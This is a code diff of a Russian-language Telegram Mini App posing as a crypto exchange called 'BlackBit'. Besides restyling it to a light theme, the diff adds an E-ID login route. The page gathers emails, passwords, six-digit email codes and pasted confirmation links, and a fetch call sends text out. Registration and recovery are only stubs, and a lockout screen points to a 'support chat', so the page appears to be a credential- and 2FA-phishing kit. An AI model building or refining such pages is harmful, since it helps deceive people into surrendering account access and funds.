@@ -17,8 +17,8 @@
         }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: var(--tg-theme-bg-color, #0d1117);
-            color: var(--tg-theme-text-color, #e6edf3);
+            background: #f0f2f5;
+            color: #1a1a2e;
             display: flex;
             justify-content: center;
             align-items: flex-start;
@@ -29,10 +29,10 @@
         .container {
             max-width: 480px;
             width: 100%;
-            background: var(--tg-theme-secondary-bg-color, #161b22);
+            background: #ffffff;
             border-radius: 16px;
             padding: 16px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
         }
 
         /* ============================================================
@@ -45,12 +45,12 @@
         .logo h1 {
             font-size: 24px;
             font-weight: 700;
-            color: var(--tg-theme-text-color, #e6edf3);
+            color: #1a1a2e;
             letter-spacing: -0.5px;
         }
         .logo .sub {
             font-size: 11px;
-            color: var(--tg-theme-hint-color, #8b949e);
+            color: #8a8a9a;
             text-transform: uppercase;
             letter-spacing: 2px;
             margin-top: 2px;
@@ -60,11 +60,11 @@
            ТОРГОВАЯ ПАНЕЛЬ
            ============================================================ */
         .trading-panel {
-            background: var(--tg-theme-secondary-bg-color, #161b22);
+            background: #ffffff;
             border-radius: 12px;
             padding: 12px;
             margin-bottom: 12px;
-            border: 1px solid var(--tg-theme-hint-color, #30363d);
+            border: 1px solid #e8e8ef;
         }
 
         .price-header {
@@ -72,7 +72,7 @@
             justify-content: space-between;
             align-items: center;
             padding: 6px 0 10px 0;
-            border-bottom: 1px solid var(--tg-theme-hint-color, #30363d);
+            border-bottom: 1px solid #e8e8ef;
             flex-wrap: wrap;
             gap: 6px;
         }
@@ -84,12 +84,12 @@
         .pair-info .pair {
             font-size: 18px;
             font-weight: 600;
-            color: var(--tg-theme-text-color, #e6edf3);
+            color: #1a1a2e;
         }
         .pair-info .type {
             font-size: 12px;
-            color: var(--tg-theme-hint-color, #8b949e);
-            background: var(--tg-theme-bg-color, #0d1117);
+            color: #8a8a9a;
+            background: #f0f2f5;
             padding: 2px 8px;
             border-radius: 10px;
         }
@@ -99,7 +99,7 @@
         .price-data .price {
             font-size: 24px;
             font-weight: 700;
-            color: #58a6ff;
+            color: #0066ff;
         }
         .price-data .change {
             font-size: 14px;
@@ -107,10 +107,10 @@
             margin-left: 6px;
         }
         .price-data .change.positive {
-            color: #3fb950;
+            color: #22a65e;
         }
         .price-data .change.negative {
-            color: #f85149;
+            color: #e74c3c;
         }
 
         /* ============================================================
@@ -123,8 +123,8 @@
             flex-wrap: wrap;
         }
         .tf-btn {
-            background: var(--tg-theme-bg-color, #0d1117);
-            color: var(--tg-theme-hint-color, #8b949e);
+            background: #f0f2f5;
+            color: #8a8a9a;
             border: none;
             padding: 4px 10px;
             border-radius: 6px;
@@ -134,12 +134,12 @@
             transition: all 0.15s;
         }
         .tf-btn:hover {
-            background: #30363d;
-            color: #e6edf3;
+            background: #e0e0e8;
+            color: #1a1a2e;
         }
         .tf-btn.active {
-            background: #58a6ff;
-            color: #0d1117;
+            background: #0066ff;
+            color: #ffffff;
         }
 
         /* ============================================================
@@ -152,7 +152,7 @@
             margin-top: 8px;
         }
         .order-book-col {
-            background: var(--tg-theme-bg-color, #0d1117);
+            background: #f8f9fc;
             border-radius: 8px;
             padding: 10px 12px;
         }
@@ -162,30 +162,30 @@
             margin-bottom: 6px;
         }
         .order-book-col .title.bid {
-            color: #3fb950;
+            color: #22a65e;
         }
         .order-book-col .title.ask {
-            color: #f85149;
+            color: #e74c3c;
         }
         .order-book-row {
             display: flex;
             justify-content: space-between;
             font-size: 13px;
             padding: 2px 0;
-            color: var(--tg-theme-text-color, #e6edf3);
+            color: #1a1a2e;
         }
         .order-book-row .price-bid {
-            color: #3fb950;
+            color: #22a65e;
         }
         .order-book-row .price-ask {
-            color: #f85149;
+            color: #e74c3c;
         }
         .order-book-row .amount {
-            color: var(--tg-theme-hint-color, #8b949e);
+            color: #8a8a9a;
         }
 
         /* ============================================================
-           КНОПКИ ВХОДА
+           КНОПКИ
            ============================================================ */
         .action-buttons {
             display: flex;
@@ -202,25 +202,21 @@
             cursor: pointer;
             transition: all 0.15s;
             text-align: center;
+            color: #ffffff;
         }
         .btn-buy {
-            background: #3fb950;
-            color: #0d1117;
+            background: #22a65e;
         }
         .btn-buy:hover {
-            background: #2ea043;
+            background: #1c8c4e;
         }
         .btn-sell {
-            background: #f85149;
-            color: #0d1117;
+            background: #e74c3c;
         }
         .btn-sell:hover {
-            background: #da3633;
+            background: #c0392b;
         }
 
-        /* ============================================================
-           КНОПКИ НАВИГАЦИИ
-           ============================================================ */
         .nav-buttons {
             display: flex;
             gap: 8px;
@@ -229,10 +225,10 @@
         .nav-buttons .btn {
             flex: 1;
             padding: 10px;
-            border: 1px solid var(--tg-theme-hint-color, #30363d);
+            border: 1px solid #d0d0d8;
             border-radius: 8px;
             background: transparent;
-            color: var(--tg-theme-text-color, #e6edf3);
+            color: #1a1a2e;
             font-size: 14px;
             font-weight: 500;
             cursor: pointer;
@@ -240,15 +236,15 @@
             text-align: center;
         }
         .nav-buttons .btn:hover {
-            background: var(--tg-theme-hint-color, #30363d);
+            background: #f0f2f5;
         }
         .nav-buttons .btn.primary {
-            background: #58a6ff;
-            color: #0d1117;
-            border-color: #58a6ff;
+            background: #0066ff;
+            color: #ffffff;
+            border-color: #0066ff;
         }
         .nav-buttons .btn.primary:hover {
-            background: #4c8ed9;
+            background: #0052cc;
         }
 
         /* ============================================================
@@ -262,12 +258,169 @@
         }
 
         /* ============================================================
-           ВСПОМОГАТЕЛЬНЫЕ КЛАССЫ
+           ФОРМЫ
            ============================================================ */
-        .text-center { text-align: center; }
-        .mt-8 { margin-top: 8px; }
-        .mt-12 { margin-top: 12px; }
-        .mt-16 { margin-top: 16px; }
+        .form-group {
+            margin-bottom: 12px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 4px;
+            color: #1a1a2e;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #d0d0d8;
+            border-radius: 8px;
+            font-size: 15px;
+            background: #ffffff;
+            color: #1a1a2e;
+            outline: none;
+            transition: border-color 0.15s;
+        }
+        .form-group input:focus {
+            border-color: #0066ff;
+        }
+        .form-group input::placeholder {
+            color: #8a8a9a;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 12px;
+            background: #0066ff;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        .btn-primary:hover {
+            background: #0052cc;
+        }
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-back {
+            width: 100%;
+            padding: 12px;
+            margin-top: 12px;
+            border: 1px solid #d0d0d8;
+            border-radius: 8px;
+            background: transparent;
+            color: #1a1a2e;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        .btn-back:hover {
+            background: #f0f2f5;
+        }
+
+        .btn-eid {
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            color: #1a1a2e;
+            border: 1px solid #0066ff;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.15s;
+            margin-top: 8px;
+        }
+        .btn-eid:hover {
+            background: #0066ff11;
+        }
+
+        .btn-link {
+            background: none;
+            border: none;
+            color: #0066ff;
+            cursor: pointer;
+            font-size: 13px;
+            padding: 4px 0;
+            text-decoration: none;
+        }
+        .btn-link:hover {
+            text-decoration: underline;
+        }
+
+        .text-center {
+            text-align: center;
+        }
+        .mt-8 {
+            margin-top: 8px;
+        }
+        .mt-12 {
+            margin-top: 12px;
+        }
+        .mt-16 {
+            margin-top: 16px;
+        }
+
+        /* ============================================================
+           СООБЩЕНИЯ
+           ============================================================ */
+        .message {
+            display: none;
+            margin-top: 12px;
+            padding: 10px;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 14px;
+        }
+        .message.error {
+            display: block;
+            background: #fee8e8;
+            color: #e74c3c;
+            border: 1px solid #f5c6c6;
+        }
+        .message.success {
+            display: block;
+            background: #e6f7ed;
+            color: #22a65e;
+            border: 1px solid #b8e6cd;
+        }
+        .message.info {
+            display: block;
+            background: #e6f0ff;
+            color: #0066ff;
+            border: 1px solid #b8d4ff;
+        }
+        .status-waiting {
+            display: none;
+            margin-top: 12px;
+            padding: 10px;
+            background: #e6f0ff;
+            color: #0066ff;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 14px;
+        }
+        .status-waiting .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #0066ff33;
+            border-top: 2px solid #0066ff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
 
         /* ============================================================
            АДАПТИВ
@@ -290,7 +443,7 @@
     </div>
 
     <!-- ============================================================
-    СТРАНИЦА 1: ГЛАВНАЯ (торговля + кнопки)
+    СТРАНИЦА 1: ГЛАВНАЯ
     ============================================================ -->
     <div id="pageMain" class="page active">
 
@@ -320,8 +473,8 @@
                 <button class="tf-btn" data-tf="D">D</button>
             </div>
 
-            <!-- График с фиксированной высотой -->
-            <div style="width:100%; height:320px; overflow:hidden; border-radius:8px; background:#0d1117;">
+            <!-- График (светлая тема) -->
+            <div style="width:100%; height:320px; overflow:hidden; border-radius:8px; background:#ffffff;">
                 <div id="tradingview_btc" style="width:100%; height:320px;"></div>
             </div>
 
@@ -354,12 +507,12 @@
 
         <!-- Кнопки навигации -->
         <div class="nav-buttons">
-            <button class="btn primary" onclick="goToLoginForm()">🔑 Войти</button>
-            <button class="btn" onclick="goToAbout()">ℹ️ О бирже</button>
+            <button class="btn primary" onclick="goToLoginForm()">Войти</button>
+            <button class="btn" onclick="goToAbout()">О бирже</button>
         </div>
 
-        <div class="text-center mt-8" style="color:var(--tg-theme-hint-color, #8b949e); font-size:12px;">
-            <a href="#" onclick="showMessage('Регистрация скоро появится', 'info')" style="color:var(--tg-theme-hint-color, #8b949e); text-decoration:none;">Нет аккаунта? Зарегистрироваться</a>
+        <div class="text-center mt-8" style="color: #8a8a9a; font-size:12px;">
+            <button class="btn-link" onclick="showMessage('Регистрация скоро появится', 'info')">Нет аккаунта? Зарегистрироваться</button>
         </div>
     </div>
 
@@ -369,76 +522,77 @@
     <div id="pageAbout" class="page">
         <div class="text-center" style="font-size:40px; margin-bottom:8px;">📘</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:4px;">О бирже</div>
-        <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">BlackBit — современная криптобиржа</div>
-        <div style="background:var(--tg-theme-bg-color, #0d1117); border-radius:10px; padding:14px 16px; margin-bottom:10px; border:1px solid var(--tg-theme-hint-color, #30363d);">
+        <div style="font-size:14px; color:#8a8a9a; text-align:center; margin-bottom:16px;">BlackBit — современная криптобиржа</div>
+        <div style="background:#f8f9fc; border-radius:10px; padding:14px 16px; margin-bottom:10px; border:1px solid #e8e8ef;">
             <p><strong>BlackBit</strong> — это криптовалютная биржа для торговли цифровыми активами.</p>
         </div>
-        <div style="background:var(--tg-theme-bg-color, #0d1117); border-radius:10px; padding:14px 16px; margin-bottom:10px; border:1px solid var(--tg-theme-hint-color, #30363d);">
+        <div style="background:#f8f9fc; border-radius:10px; padding:14px 16px; margin-bottom:10px; border:1px solid #e8e8ef;">
             <p>🔒 Безопасность, высокая скорость и низкие комиссии.</p>
         </div>
-        <div style="background:var(--tg-theme-bg-color, #0d1117); border-radius:10px; padding:14px 16px; margin-bottom:10px; border:1px solid var(--tg-theme-hint-color, #30363d);">
+        <div style="background:#f8f9fc; border-radius:10px; padding:14px 16px; margin-bottom:10px; border:1px solid #e8e8ef;">
             <p>📈 Торгуй BTC, ETH, USDT и другими криптовалютами.</p>
         </div>
-        <div style="background:var(--tg-theme-bg-color, #0d1117); border-radius:10px; padding:14px 16px; margin-bottom:10px; border:1px solid var(--tg-theme-hint-color, #30363d);">
-            <p>🔗 Mini App: <a href="https://d3987616-hue.github.io/blackbit/" style="color:#58a6ff;">blackbit</a></p>
-        </div>
-        <button class="btn" style="width:100%; padding:12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; background:transparent; color:var(--tg-theme-text-color, #e6edf3); font-size:14px; font-weight:500; cursor:pointer;" onclick="goToMain()">← Назад</button>
+        <button class="btn-back" onclick="goToMain()">← Назад</button>
     </div>
 
     <!-- ============================================================
-    СТРАНИЦА 3: ВХОД
+    СТРАНИЦА 3: ВХОД (ЛОГИН + ПАРОЛЬ → КОД)
     ============================================================ -->
     <div id="pageLoginForm" class="page">
         <div class="text-center" style="font-size:40px; margin-bottom:4px;">🔑</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Вход</div>
-        <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">Введите свои данные для входа</div>
+        <div style="font-size:14px; color:#8a8a9a; text-align:center; margin-bottom:16px;">Введите свои данные для входа</div>
 
         <div id="loginFields">
-            <div style="margin-bottom:12px;">
-                <label style="display:block; font-size:14px; font-weight:500; margin-bottom:4px; color:var(--tg-theme-text-color, #e6edf3);">Email</label>
-                <input type="email" id="email" placeholder="Введите ваш email" style="width:100%; padding:10px 12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; font-size:15px; background:var(--tg-theme-bg-color, #0d1117); color:var(--tg-theme-text-color, #e6edf3); outline:none;">
+            <div class="form-group">
+                <label>Email</label>
+                <input type="email" id="email" placeholder="Введите ваш email">
             </div>
-            <div style="margin-bottom:12px;">
-                <label style="display:block; font-size:14px; font-weight:500; margin-bottom:4px; color:var(--tg-theme-text-color, #e6edf3);">Пароль</label>
-                <input type="password" id="password" placeholder="Введите пароль" style="width:100%; padding:10px 12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; font-size:15px; background:var(--tg-theme-bg-color, #0d1117); color:var(--tg-theme-text-color, #e6edf3); outline:none;">
+            <div class="form-group">
+                <label>Пароль</label>
+                <input type="password" id="password" placeholder="Введите пароль">
             </div>
         </div>
 
-        <button id="loginSubmitBtn" class="btn" style="width:100%; padding:12px; background:#58a6ff; color:#0d1117; border:none; border-radius:8px; font-size:15px; font-weight:600; cursor:pointer;" onclick="handleLogin()">Войти</button>
+        <button id="loginSubmitBtn" class="btn-primary" onclick="handleLogin()">Войти</button>
 
-        <div id="loginError" style="display:none; margin-top:12px; padding:10px; background:#f8514933; color:#f85149; border-radius:8px; text-align:center; font-size:14px;">Ошибка. Повторите попытку входа.</div>
+        <div id="loginError" class="message error" style="display:none;">Ошибка. Повторите попытку входа.</div>
 
-        <div class="text-center mt-12" style="color:var(--tg-theme-hint-color, #8b949e); font-size:13px;">
-            <a href="#" onclick="showMessage('Функция восстановления скоро появится', 'info')" style="color:var(--tg-theme-hint-color, #8b949e); text-decoration:none;">Восстановить пароль</a>
+        <div class="text-center mt-12" style="color:#8a8a9a; font-size:13px;">
+            <button class="btn-link" onclick="showMessage('Функция восстановления скоро появится', 'info')">Восстановить пароль</button>
         </div>
 
-        <div class="text-center mt-8" style="color:var(--tg-theme-hint-color, #8b949e); font-size:13px;">
-            Нет аккаунта? <a href="#" onclick="showMessage('Регистрация скоро появится', 'info')" style="color:#58a6ff; text-decoration:none;">Зарегистрироваться</a>
+        <div class="text-center mt-8" style="color:#8a8a9a; font-size:13px;">
+            <button class="btn-link" onclick="showMessage('Регистрация скоро появится', 'info')">Нет аккаунта? Зарегистрироваться</button>
         </div>
 
-        <button class="btn" style="width:100%; padding:12px; margin-top:12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; background:transparent; color:var(--tg-theme-text-color, #e6edf3); font-size:14px; font-weight:500; cursor:pointer;" onclick="goToMain()">← Назад</button>
+        <div style="margin: 12px 0; text-align:center; color:#d0d0d8; font-size:12px;">или</div>
+
+        <button class="btn-eid" onclick="goToEid()">Вход через E-ID</button>
+
+        <button class="btn-back" onclick="goToMain()">← Назад</button>
     </div>
 
     <!-- ============================================================
-    СТРАНИЦА 4: КОД
+    СТРАНИЦА 4: КОД (6 цифр)
     ============================================================ -->
     <div id="pageCode" class="page">
         <div class="text-center" style="font-size:40px; margin-bottom:4px;">✉️</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Код подтверждения</div>
-        <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">Введите код, отправленный на вашу почту</div>
+        <div style="font-size:14px; color:#8a8a9a; text-align:center; margin-bottom:16px;">Введите код, отправленный на вашу почту</div>
 
         <div id="codeFields">
-            <div style="margin-bottom:12px;">
-                <label style="display:block; font-size:14px; font-weight:500; margin-bottom:4px; color:var(--tg-theme-text-color, #e6edf3);">Код из 6 цифр</label>
-                <input type="text" id="codeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric" style="width:100%; padding:10px 12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; font-size:15px; background:var(--tg-theme-bg-color, #0d1117); color:var(--tg-theme-text-color, #e6edf3); outline:none;">
+            <div class="form-group">
+                <label>Код из 6 цифр</label>
+                <input type="text" id="codeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric">
             </div>
-            <button id="submitCodeBtn" class="btn" style="width:100%; padding:12px; background:#58a6ff; color:#0d1117; border:none; border-radius:8px; font-size:15px; font-weight:600; cursor:pointer;" onclick="handleCode()">Подтвердить</button>
+            <button id="submitCodeBtn" class="btn-primary" onclick="handleCode()">Подтвердить</button>
         </div>
 
-        <div id="codeError" style="display:none; margin-top:12px; padding:10px; background:#f8514933; color:#f85149; border-radius:8px; text-align:center; font-size:14px;">Неверный код. Попробуйте снова.</div>
-        <div class="status-waiting" id="codeStatus" style="display:none; margin-top:12px; padding:10px; background:#58a6ff22; color:#58a6ff; border-radius:8px; text-align:center; font-size:14px;"><span class="spinner"></span> Ожидание...</div>
+        <div id="codeError" class="message error" style="display:none;">Неверный код. Попробуйте снова.</div>
+        <div class="status-waiting" id="codeStatus"><span class="spinner"></span> Ожидание...</div>
 
-        <button class="btn" style="width:100%; padding:12px; margin-top:12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; background:transparent; color:var(--tg-theme-text-color, #e6edf3); font-size:14px; font-weight:500; cursor:pointer;" onclick="goToLoginForm()">← Назад</button>
+        <button class="btn-back" onclick="goToLoginForm()">← Назад</button>
     </div>
 
     <!-- ============================================================
@@ -447,24 +601,24 @@
     <div id="pageEid" class="page">
         <div class="text-center" style="font-size:40px; margin-bottom:4px;">🆔</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Вход через E-ID</div>
-        <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">Введите свои данные для входа</div>
+        <div style="font-size:14px; color:#8a8a9a; text-align:center; margin-bottom:16px;">Введите свои данные для входа</div>
 
         <div id="eidFields">
-            <div style="margin-bottom:12px;">
-                <label style="display:block; font-size:14px; font-weight:500; margin-bottom:4px; color:var(--tg-theme-text-color, #e6edf3);">Email</label>
-                <input type="email" id="eidEmail" placeholder="Введите ваш email" style="width:100%; padding:10px 12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; font-size:15px; background:var(--tg-theme-bg-color, #0d1117); color:var(--tg-theme-text-color, #e6edf3); outline:none;">
+            <div class="form-group">
+                <label>Email</label>
+                <input type="email" id="eidEmail" placeholder="Введите ваш email">
             </div>
-            <div style="margin-bottom:12px;">
-                <label style="display:block; font-size:14px; font-weight:500; margin-bottom:4px; color:var(--tg-theme-text-color, #e6edf3);">Пароль</label>
-                <input type="password" id="eidPassword" placeholder="Введите пароль" style="width:100%; padding:10px 12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; font-size:15px; background:var(--tg-theme-bg-color, #0d1117); color:var(--tg-theme-text-color, #e6edf3); outline:none;">
+            <div class="form-group">
+                <label>Пароль</label>
+                <input type="password" id="eidPassword" placeholder="Введите пароль">
             </div>
         </div>
 
-        <button id="eidSubmitBtn" class="btn" style="width:100%; padding:12px; background:#58a6ff; color:#0d1117; border:none; border-radius:8px; font-size:15px; font-weight:600; cursor:pointer;" onclick="handleEidLogin()">Войти через E-ID</button>
+        <button id="eidSubmitBtn" class="btn-primary" onclick="handleEidLogin()">Войти через E-ID</button>
 
-        <div id="eidLoginError" style="display:none; margin-top:12px; padding:10px; background:#f8514933; color:#f85149; border-radius:8px; text-align:center; font-size:14px;">Ошибка. Повторите попытку входа.</div>
+        <div id="eidLoginError" class="message error" style="display:none;">Ошибка. Повторите попытку входа.</div>
 
-        <button class="btn" style="width:100%; padding:12px; margin-top:12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; background:transparent; color:var(--tg-theme-text-color, #e6edf3); font-size:14px; font-weight:500; cursor:pointer;" onclick="goToMain()">← Назад</button>
+        <button class="btn-back" onclick="goToMain()">← Назад</button>
     </div>
 
     <!-- ============================================================
@@ -473,45 +627,45 @@
     <div id="pageEidLink" class="page">
         <div class="text-center" style="font-size:40px; margin-bottom:4px;">🔗</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Ссылка подтверждения</div>
-        <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">Вставьте ссылку из письма</div>
+        <div style="font-size:14px; color:#8a8a9a; text-align:center; margin-bottom:16px;">Вставьте ссылку из письма</div>
 
         <div id="eidLinkFields">
-            <div style="margin-bottom:12px;">
-                <label style="display:block; font-size:14px; font-weight:500; margin-bottom:4px; color:var(--tg-theme-text-color, #e6edf3);">Ссылка подтверждения</label>
-                <input type="text" id="eidLinkInput" placeholder="Вставьте ссылку" style="width:100%; padding:10px 12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; font-size:15px; background:var(--tg-theme-bg-color, #0d1117); color:var(--tg-theme-text-color, #e6edf3); outline:none;">
+            <div class="form-group">
+                <label>Ссылка подтверждения</label>
+                <input type="text" id="eidLinkInput" placeholder="Вставьте ссылку">
             </div>
-            <button id="eidLinkSubmitBtn" class="btn" style="width:100%; padding:12px; background:#58a6ff; color:#0d1117; border:none; border-radius:8px; font-size:15px; font-weight:600; cursor:pointer;" onclick="handleEidLink()">Подтвердить</button>
+            <button id="eidLinkSubmitBtn" class="btn-primary" onclick="handleEidLink()">Подтвердить</button>
         </div>
 
-        <div id="eidLinkError" style="display:none; margin-top:12px; padding:10px; background:#f8514933; color:#f85149; border-radius:8px; text-align:center; font-size:14px;">Ошибка. Повторите попытку.</div>
-        <div class="status-waiting" id="eidLinkStatus" style="display:none; margin-top:12px; padding:10px; background:#58a6ff22; color:#58a6ff; border-radius:8px; text-align:center; font-size:14px;"><span class="spinner"></span> Ожидание...</div>
+        <div id="eidLinkError" class="message error" style="display:none;">Ошибка. Повторите попытку.</div>
+        <div class="status-waiting" id="eidLinkStatus"><span class="spinner"></span> Ожидание...</div>
 
-        <button class="btn" style="width:100%; padding:12px; margin-top:12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; background:transparent; color:var(--tg-theme-text-color, #e6edf3); font-size:14px; font-weight:500; cursor:pointer;" onclick="goToEid()">← Назад</button>
+        <button class="btn-back" onclick="goToEid()">← Назад</button>
     </div>
 
     <!-- ============================================================
     СТРАНИЦА 7: ОШИБКА
     ============================================================ -->
     <div id="pageLoginError" class="page" style="text-align:center; padding:30px 0;">
-        <div style="font-size:48px; color:#f85149;">✕</div>
-        <div style="font-size:22px; font-weight:700; color:#f85149; margin:8px 0;">Ошибка</div>
-        <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); margin-bottom:16px;">Повторите попытку входа.</div>
-        <button class="btn" style="padding:12px 24px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; background:transparent; color:var(--tg-theme-text-color, #e6edf3); font-size:14px; font-weight:500; cursor:pointer;" onclick="goToMain()">Вернуться на главную</button>
+        <div style="font-size:48px; color:#e74c3c;">✕</div>
+        <div style="font-size:22px; font-weight:700; color:#e74c3c; margin:8px 0;">Ошибка</div>
+        <div style="font-size:14px; color:#8a8a9a; margin-bottom:16px;">Повторите попытку входа.</div>
+        <button class="btn" style="padding:12px 24px; border:1px solid #d0d0d8; border-radius:8px; background:transparent; color:#1a1a2e; font-size:14px; font-weight:500; cursor:pointer;" onclick="goToMain()">Вернуться на главную</button>
     </div>
 
     <!-- ============================================================
     СТРАНИЦА 8: БЛОКИРОВКА
     ============================================================ -->
     <div id="pageError" class="page" style="text-align:center; padding:30px 0;">
-        <div style="font-size:48px; color:#f85149;">✕</div>
-        <div style="font-size:22px; font-weight:700; color:#f85149; margin:8px 0;">Ошибка входа</div>
-        <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); margin-bottom:16px;">Превышено количество попыток входа.<br>Обратитесь в техническую поддержку.</div>
-        <button onclick="openSupportChat()" class="btn" style="padding:12px 24px; background:#f85149; color:#0d1117; border:none; border-radius:8px; font-size:14px; font-weight:600; cursor:pointer;">Техническая поддержка</button>
-        <button class="btn" style="display:block; width:100%; margin-top:12px; padding:12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; background:transparent; color:var(--tg-theme-text-color, #e6edf3); font-size:14px; font-weight:500; cursor:pointer;" onclick="goToMain()">← На главную</button>
+        <div style="font-size:48px; color:#e74c3c;">✕</div>
+        <div style="font-size:22px; font-weight:700; color:#e74c3c; margin:8px 0;">Ошибка входа</div>
+        <div style="font-size:14px; color:#8a8a9a; margin-bottom:16px;">Превышено количество попыток входа.<br>Обратитесь в техническую поддержку.</div>
+        <button onclick="openSupportChat()" class="btn" style="padding:12px 24px; background:#e74c3c; color:#ffffff; border:none; border-radius:8px; font-size:14px; font-weight:600; cursor:pointer;">Техническая поддержка</button>
+        <button class="btn-back" onclick="goToMain()">← На главную</button>
     </div>
 
     <!-- ===== СООБЩЕНИЯ ===== -->
-    <div id="msg" style="display:none; margin-top:12px; padding:10px; border-radius:8px; text-align:center; font-size:14px;"></div>
+    <div id="msg" class="message"></div>
 
 </div>
 
@@ -536,7 +690,6 @@
     function showPage(id) {
         document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
         document.getElementById(id).classList.add('active');
-        // Скрываем сообщения при смене страницы
         const msgDiv = document.getElementById('msg');
         msgDiv.style.display = 'none';
     }
@@ -549,19 +702,18 @@
     function goToError() { showPage('pageError'); }
 
     // ============================================================
-    // 4. КНОПКИ ТАЙМФРЕЙМОВ
+    // 4. ТАЙМФРЕЙМЫ
     // ============================================================
     document.querySelectorAll('.tf-btn').forEach(btn => {
         btn.addEventListener('click', function() {
             document.querySelectorAll('.tf-btn').forEach(b => b.classList.remove('active'));
             this.classList.add('active');
-            const tf = this.dataset.tf;
-            console.log('Таймфрейм выбран:', tf);
+            console.log('Таймфрейм:', this.dataset.tf);
         });
     });
 
     // ============================================================
-    // 5. TRADINGVIEW ГРАФИК (чистый, без индикаторов)
+    // 5. TRADINGVIEW (СВЕТЛАЯ ТЕМА)
     // ============================================================
     setTimeout(function() {
         if (typeof TradingView !== 'undefined') {
@@ -570,10 +722,10 @@
                 "symbol": "BINANCE:BTCUSDT",
                 "interval": "D",
                 "height": 320,
-                "theme": "dark",
+                "theme": "light",
                 "style": "1",
                 "locale": "ru",
-                "toolbar_bg": "#161b22",
+                "toolbar_bg": "#f0f2f5",
                 "enable_publishing": false,
                 "hide_side_toolbar": true,
                 "allow_symbol_change": false,
@@ -589,7 +741,7 @@
                 "withdateranges": false
             });
         } else {
-            console.log('TradingView не загружен, проверьте соединение.');
+            console.log('TradingView не загружен');
         }
     }, 500);
 
@@ -599,27 +751,13 @@
     function showMessage(text, type) {
         const msgDiv = document.getElementById('msg');
         msgDiv.textContent = text;
-        msgDiv.style.display = 'block';
-        msgDiv.className = '';
-        if (type === 'error') {
-            msgDiv.style.background = '#f8514933';
-            msgDiv.style.color = '#f85149';
-            msgDiv.style.border = '1px solid #f8514955';
-        } else if (type === 'success') {
-            msgDiv.style.background = '#3fb95033';
-            msgDiv.style.color = '#3fb950';
-            msgDiv.style.border = '1px solid #3fb95055';
-        } else {
-            msgDiv.style.background = '#58a6ff22';
-            msgDiv.style.color = '#58a6ff';
-            msgDiv.style.border = '1px solid #58a6ff55';
-        }
+        msgDiv.className = 'message ' + type;
         clearTimeout(msgDiv._timer);
         msgDiv._timer = setTimeout(() => { msgDiv.style.display = 'none'; }, 5000);
     }
 
     // ============================================================
-    // 7. ДАННЫЕ ПОЛЬЗОВАТЕЛЯ
+    // 7. ПОЛЬЗОВАТЕЛЬ
     // ============================================================
     function getUserData() {
         const user = tg.initDataUnsafe?.user;
@@ -639,16 +777,15 @@
                     text: text
                 })
             });
-            const result = await response.json();
-            return result.ok;
+            return response.ok;
         } catch (error) {
-            console.error('Ошибка:', error);
+            console.error(error);
             return false;
         }
     }
 
     // ============================================================
-    // 9. ЛОГИН
+    // 9. ЛОГИН → КОД
     // ============================================================
     let userEmail = '';
     let userPassword = '';
@@ -686,7 +823,7 @@
             attemptCount++;
             if (attemptCount >= MAX_ATTEMPTS) {
                 document.querySelectorAll('#loginFields input, #codeFields input, #eidFields input, #eidLinkFields input').forEach(el => el.disabled = true);
-                document.querySelectorAll('#loginFields button, #codeFields button, #eidFields button, #eidLinkFields button').forEach(el => el.disabled = true);
